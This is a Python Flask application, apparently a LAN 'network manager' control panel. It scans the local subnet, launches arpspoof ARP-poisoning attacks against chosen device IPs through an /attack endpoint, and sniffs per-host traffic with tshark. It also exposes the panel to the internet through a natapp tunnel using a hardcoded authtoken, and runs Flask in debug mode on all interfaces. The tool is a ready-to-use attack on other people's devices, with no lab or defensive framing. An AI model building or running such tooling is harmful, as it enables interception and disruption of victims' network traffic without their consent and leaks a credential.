from flask import Flask, render_template, jsonify, request, Response
import scanner
import threading
import time
import sys
import subprocess
import queue
import os
import re
import atexit
import argparse

# Parse command line arguments
parser = argparse.ArgumentParser(description='Network Manager')
parser.add_argument('--token', type=str, help='Natapp authtoken', default=None)
args, unknown = parser.parse_known_args() # Use parse_known_args to avoid conflict with flask/other args if any

# Determine paths
if getattr(sys, 'frozen', False):
    # Frozen (exe)
    BASE_DIR = os.path.dirname(sys.executable)
    # Flask templates are bundled in _MEIPASS when using --add-data
    TEMPLATE_FOLDER = os.path.join(sys._MEIPASS, 'templates')
    app = Flask(__name__, template_folder=TEMPLATE_FOLDER)
else:
    # Script
    BASE_DIR = os.getcwd()
    app = Flask(__name__)

# Global variables
active_attacks = {} # target_ip -> subprocess.Popen
log_queue = queue.Queue()
MAX_LOG_LINES = 50

ARPSPOOF_PATH = os.path.join(BASE_DIR, 'tools', 'arpspoof.exe')
TSHARK_PATH = os.path.join(BASE_DIR, 'tools', 'Wireshark', 'tshark.exe')
NATAPP_PATH = os.path.join(BASE_DIR, 'tools', 'natapp.exe')

public_url = None

def start_natapp():
    global public_url
    if not os.path.exists(NATAPP_PATH):
        print(f"natapp not found at {NATAPP_PATH}")
        return

    try:
        # Use token from args if provided, otherwise default (or rely on config.ini)
        token = args.token if args.token else "e221e3f75afd800f"
        
        def run_natapp():
            global public_url
            try:
                # Run in tools directory
                cwd = os.path.dirname(NATAPP_PATH)
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                
                cmd = [NATAPP_PATH]
                if token:
                    cmd.append(f"-authtoken={token}")
                
                process = subprocess.Popen(
                    cmd, 
                    cwd=cwd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    startupinfo=startupinfo
                )
                
                while True:
                    line = process.stdout.readline()
                    if not line:
                        break
                    decoded = line.decode('utf-8', errors='ignore').strip()
                    print(f"[NATAPP] {decoded}")
                    
                    # Parse URL like: http://somename.natapp1.cc -> 127.0.0.1:80
                    # Regex for natapp url
                    match = re.search(r'(http://[a-zA-Z0-9]+\.natapp[0-9]*\.cc)', decoded)
                    if match:
                        public_url = match.group(1)
                        print(f"[SYSTEM] Public URL found: {public_url}")
                        
            except Exception as e:
                print(f"Error running natapp: {e}")

        # Start natapp thread
        # Note: In a real scenario, natapp free version asks for login or authtoken if not configured.
        # We assume it's configured in tools/config.ini or similar.
        t = threading.Thread(target=run_natapp)
        t.daemon = True
        t.start()
        
    except Exception as e:
        print(f"Failed to start natapp: {e}")

# Start natapp on startup
start_natapp()

def get_interfaces_info():
    """
    Parses output of arpspoof.exe --list to find interfaces and gateways.
    Returns a list of dicts.
    """
    if not os.path.exists(ARPSPOOF_PATH):
        return []

    try:
        cmd = [ARPSPOOF_PATH, "--list"]
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        
        # arpspoof returns exit code 1 even on success sometimes or simply due to implementation quirks
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, startupinfo=startupinfo)
        
        # Combine stdout and stderr, try to decode with mbcs (Windows ANSI) first
        raw_output = result.stdout + result.stderr
        try:
            output = raw_output.decode('mbcs')
        except:
            output = raw_output.decode('utf-8', errors='ignore')
        
        interfaces = []
        # Output format example:
        # 1. \Device\NPF_{GUID}   Description
        #         192.168.1.7/24 gw=192.168.1.1
        
        lines = output.splitlines()
        current_iface = {}
        
        for line in lines:
            line = line.strip()
            if not line: continue
            
            # Match line 1: Index. Name Description
            # Regex: ^(\d+)\.\s+(\S+)\s+(.*)$
            match_header = re.match(r'^(\d+)\.\s+(\S+)\s+(.*)$', line)
            if match_header:
                if current_iface:
                    interfaces.append(current_iface)
                current_iface = {
                    'index': match_header.group(1),
                    'name': match_header.group(2),
                    'desc': match_header.group(3),
                    'ip': None,
                    'gateway': None
                }
            else:
                # Match line 2: IP/Mask gw=Gateway
                # Regex: ([0-9.]+)/(\d+)\s+gw=([0-9.]+)
                match_ip = re.match(r'([0-9.]+)/(\d+)\s+gw=([0-9.]+)', line)
                if match_ip and current_iface:
                    current_iface['ip'] = match_ip.group(1)
                    current_iface['gateway'] = match_ip.group(3)

        if current_iface:
            interfaces.append(current_iface)
            
        return interfaces
    except Exception as e:
        print(f"Error getting interfaces: {e}")
        return []

def get_working_interface():
    """
    Returns (gateway_ip, interface_index, local_ip, full_name) of the first working interface.
    """
    interfaces = get_interfaces_info()
    for iface in interfaces:
        if iface.get('gateway') and iface.get('gateway') != '0.0.0.0':
            return iface['gateway'], iface['index'], iface['ip'], iface['name']
    
    # Fallback if no clear gateway
    if interfaces:
        # Try to find one with an IP at least
        for iface in interfaces:
            if iface.get('ip'):
                return iface.get('gateway', '192.168.1.1'), iface['index'], iface['ip'], iface['name']
                
        return interfaces[0].get('gateway', '192.168.1.1'), interfaces[0]['index'], interfaces[0].get('ip', '127.0.0.1'), interfaces[0]['name']
        
    return "192.168.1.1", "1", "127.0.0.1", ""

def get_tshark_interface_index(guid_name):
    """
    Finds the tshark interface index that matches the given GUID name.
    """
    if not os.path.exists(TSHARK_PATH):
        return None
        
    try:
        cmd = [TSHARK_PATH, "-D"]
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        
        output = subprocess.check_output(cmd, startupinfo=startupinfo).decode('utf-8', errors='ignore')
        
        # Output format:
        # 1. \Device\NPF_{GUID} (Description)
        for line in output.splitlines():
            line = line.strip()
            # Match index and name
            # Regex: ^(\d+)\.\s+(\S+)
            match = re.match(r'^(\d+)\.\s+(\S+)', line)
            if match:
                idx = match.group(1)
                name = match.group(2)
                if name == guid_name:
                    return idx
        return None
    except Exception as e:
        print(f"Error finding tshark interface: {e}")
        return None

class TrafficMonitor:
    def __init__(self):
        self.process = None
        self.stats = {} # {ip: {'tx': 0, 'rx': 0, 'tx_speed': 0, 'rx_speed': 0}}
        self.lock = threading.Lock()
        self.running = False
        self.last_reset = time.time()
        
    def start(self, interface_idx):
        if self.running:
            return
            
        if not os.path.exists(TSHARK_PATH):
            print("Tshark not found")
            return

        cmd = [
            TSHARK_PATH, 
            '-i', str(interface_idx), 
            '-l', # Flush stdout after each packet
            '-T', 'fields', 
            '-e', 'ip.src', 
            '-e', 'ip.dst', 
            '-e', 'frame.len'
        ]
        
        try:
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            
            self.process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, startupinfo=startupinfo)
            self.running = True
            
            t = threading.Thread(target=self._worker)
            t.daemon = True
            t.start()
            
            # Speed calculator thread
            t_speed = threading.Thread(target=self._speed_worker)
            t_speed.daemon = True
            t_speed.start()
            
            print(f"[TrafficMonitor] Started on interface {interface_idx}")
        except Exception as e:
            print(f"[TrafficMonitor] Error starting: {e}")

    def stop(self):
        self.running = False
        if self.process:
            self.process.terminate()
            try:
                self.process.wait(timeout=1)
            except:
                self.process.kill()
            self.process = None

    def _worker(self):
        # Reads stdout
        while self.running and self.process:
            line = self.process.stdout.readline()
            if not line:
                break
            
            try:
                # Line format: 192.168.1.x  192.168.1.y  60
                decoded = line.decode('utf-8', errors='ignore').strip()
                parts = decoded.split()
                if len(parts) >= 3:
                    src_ip = parts[0]
                    dst_ip = parts[1]
                    try:
                        length = int(parts[-1])
                    except ValueError:
                        continue
                        
                    with self.lock:
                        # Update src (TX)
                        if src_ip not in self.stats:
                            self.stats[src_ip] = {'tx': 0, 'rx': 0, 'tx_speed': 0, 'rx_speed': 0, 'last_tx': 0, 'last_rx': 0}
                        self.stats[src_ip]['tx'] += length
                        
                        # Update dst (RX)
                        if dst_ip not in self.stats:
                            self.stats[dst_ip] = {'tx': 0, 'rx': 0, 'tx_speed': 0, 'rx_speed': 0, 'last_tx': 0, 'last_rx': 0}
                        self.stats[dst_ip]['rx'] += length
            except Exception:
                pass

    def _speed_worker(self):
        while self.running:
            time.sleep(1)
            with self.lock:
                for ip, data in self.stats.items():
                    # Calculate speed based on diff from last check
                    # Actually, simple way: tx_speed = tx - last_tx
                    
                    current_tx = data['tx']
                    current_rx = data['rx']
                    
                    data['tx_speed'] = current_tx - data.get('last_tx', 0)
                    data['rx_speed'] = current_rx - data.get('last_rx', 0)
                    
                    data['last_tx'] = current_tx
                    data['last_rx'] = current_rx

    def get_all_stats(self):
        with self.lock:
            # Return copy
            return {k: v.copy() for k, v in self.stats.items()}

traffic_monitor = TrafficMonitor()

def log_worker(target_ip, process):
    """
    Reads stderr/stdout from the process and pushes to log_queue
    """
    stream = process.stderr 
    
    while True:
        line = stream.readline()
        if not line and process.poll() is not None:
            break
        if line:
            msg = f"[{target_ip}] {line.decode('utf-8', errors='replace').strip()}"
            log_queue.put(msg)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/scan')
def scan_network():
    gateway, idx, local_ip, iface_name = get_working_interface()
    
    # Try to start traffic monitor if not running
    if not traffic_monitor.running and iface_name:
        tshark_idx = get_tshark_interface_index(iface_name)
        if tshark_idx:
            traffic_monitor.start(tshark_idx)
        else:
            print(f"[Warning] Could not find tshark interface for {iface_name}")

    # Guess subnet from local_ip
    # Simple /24 assumption
    subnet = ".".join(local_ip.split('.')[:3]) + ".1/24"
    print(f"[DEBUG] Local IP: {local_ip}, Gateway: {gateway}, Interface Index: {idx}")
    print(f"[DEBUG] Scanning subnet: {subnet}")
    
    devices = scanner.scan(subnet)
    
    # Annotate active attacks
    for d in devices:
        if d['ip'] in active_attacks:
            d['is_attacked'] = True
        else:
            d['is_attacked'] = False
            
    return jsonify(devices)

@app.route('/attack', methods=['POST'])
def attack():
    data = request.json
    target_ip = data.get('target_ip')
    action = data.get('action') # start or stop
    
    if not target_ip:
        return jsonify({"status": "error", "message": "Target IP required"}), 400

    gateway, interface_idx, local_ip, _ = get_working_interface()

    if action == 'start':
        if target_ip in active_attacks:
            return jsonify({"status": "error", "message": "Attack already running on this target"}), 400
        
        if not os.path.exists(ARPSPOOF_PATH):
             return jsonify({"status": "error", "message": "arpspoof tool not found."}), 500

        # Command: arpspoof -i <interface_idx> -t <target> <gateway>
        # Note: arpspoof on windows uses index or name.
        cmd = [ARPSPOOF_PATH, "-i", str(interface_idx), "-t", target_ip, gateway]
        
        try:
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, startupinfo=startupinfo)
            active_attacks[target_ip] = proc
            
            # Start log monitor thread
            t = threading.Thread(target=log_worker, args=(target_ip, proc))
            t.daemon = True
            t.start()
            
            log_queue.put(f"[SYSTEM] Attack started on {target_ip} via interface {interface_idx} (Gateway: {gateway})")
            return jsonify({"status": "success", "message": f"Attack started on {target_ip}"})
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500

    elif action == 'stop':
        if target_ip in active_attacks:
            proc = active_attacks[target_ip]
            proc.terminate()
            try:
                proc.wait(timeout=2)
            except subprocess.TimeoutExpired:
                proc.kill()
            
            del active_attacks[target_ip]
            log_queue.put(f"[SYSTEM] Attack stopped on {target_ip}")
            return jsonify({"status": "success", "message": f"Attack stopped on {target_ip}"})
        else:
             return jsonify({"status": "error", "message": "No active attack found for this target"}), 404
    
    return jsonify({"status": "error", "message": "Invalid action"})

@app.route('/public_url')
def get_public_url():
    global public_url
    return jsonify({"url": public_url})

@app.route('/logs')
def get_logs():
    logs = []
    while not log_queue.empty():
        logs.append(log_queue.get())
    return jsonify(logs)

@app.route('/traffic')
def get_traffic():
    stats = traffic_monitor.get_all_stats()
    return jsonify(stats)

@atexit.register
def cleanup():
    traffic_monitor.stop()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
